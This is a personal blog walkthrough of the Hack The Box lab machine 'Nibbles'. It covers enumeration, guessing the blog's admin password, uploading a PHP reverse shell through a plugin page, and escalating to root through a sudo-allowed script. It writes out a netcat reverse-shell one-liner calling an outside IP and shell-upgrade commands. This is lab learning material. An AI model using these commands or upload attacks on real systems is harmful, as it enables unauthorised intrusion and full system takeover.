---
title: "[HTB] Nibbles"
author: "Wook Lee"
date: "2024-08-08"
tags: ["Hack The Box"]
---

#### enumeration using nmap scan

from the output of nmap scan I learned there were 2 open ports and the one I had to look into was the port 80.
![alt text](image-29.png#center)

<br>

Navigated to the target address on firefox but the website didn't have any juicy info except the plain text saying **_Hello world!_**.
![alt text](image-30.png#center)

<br>

right clicked on the web page and **_viewed the source code_** without any expectation but there was this interesting comment.
![alt text](image-31.png#center)

<br>

navigated to the **_/nibbleblog_** as the comment hinted
![alt text](image-32.png#center)

<br>

#### more information gathering with **_gobuster_**

while on the **_/nibbleblog_** web page, I could not find more useful info so I decided to run a **_gobuster_** on the website to gather more information.
![alt text](image-33.png#center)

<br>

The gobuster output showed many directories but the results were not satisfying. I knew there had to be more. So I ran another **_gobuster_** scan but this time I added the **-x** option to search for specific file extensions.

The **_/admin.php_** was the first result that caught my eye.

![alt text](image-34.png#center)

<br>

**_/nibbleblog/admin.php_**

![alt text](image-35.png#center)

<br>

I didn't have anything for the admin credentials until I found this **_user.xml_** file that's located in the following path:
**_/nibbleblog/content/private/users.xml_**
![alt text](image-36.png#center)

<br>

The title of the nibbleblog was **_nibbles_** so why not try that for the password? and it turned out that it was the password. I was skeptical of doing the guesswork for the password but later I refered to other people's write ups but all of them also did some guessworks to figure out the password. I guess it's an important part of the pentesting.

![alt text](image-37.png#center)

<br>

a screenshot of the admin dashboard page
![alt text](image-38.png#center)

<br>

Under the **/plugins** directory, there was this **_my image_** page where I could upload a file to the server and I definitely knew I could use this for uploading a reverse shell payload as an exploitation.

![alt text](image-39.png#center)

<br>

For the reverse shell payload, I downloaded the popular **_pentestmonkey_**'s php-reverse-shell.
![alt text](image-40.png#center)

<br>

![alt text](image-41.png#center)

<br>

After uploading the payload file I had to manually navigate to the following path to run it on the server.

**_/nibbleblog/content/private/plugins/my_image_**
![alt text](image-1.png#center)

<br>

**_netcat listener_** successfully captured the reverse shell.
![alt text](image-2.png#center)

<br>

got the user flag!

oh I almost forgot. As you could notice from the screenshot below, I upgraded the shell to the **_fully interactive TTY Shell_**.

```shell
#reverse shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z # background

#kali
stty raw -echo; fg
reset

#reverse shell
export SHELL=bash
export TERM=xterm-256color
```

---

![alt text](image-3.png#center)

<br>

**_privilege escalation_**

With the reverse shell, the current user, **nibbler** was not able to access the root directory. So I had to figure a way for privilege escalation. I ran the `sudo -l` command to list the commands I can actually run with the **sudo** and I could run the following

`/home/nibbler/personal/stuff/monitor.sh`

![alt text](image-4.png#center)

<br>

This is the part where I needed some help. I couldn't figure out what it took me to write inside the **monitor.sh** file for privilege escalation so I refered to one of the walkthroughs online.

`echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.15 1235 >/tmp/f' > /home/nibbler/personal/stuff/monitor.sh`

<br>

After modifying the content inside the file, I pop opened another netcat listener with another port, 1235 because the port 1234 was already listening for the original reverse shell.

`sudo /home/nibbler/personal/stuff/monitor.sh`

<br>

**id** command returned that I'm the root user
![alt text](image-5.png#center)

<br>

successfully got the root flag
![alt text](image-6.png#center)

<br>

![alt text](image-7.png#center)
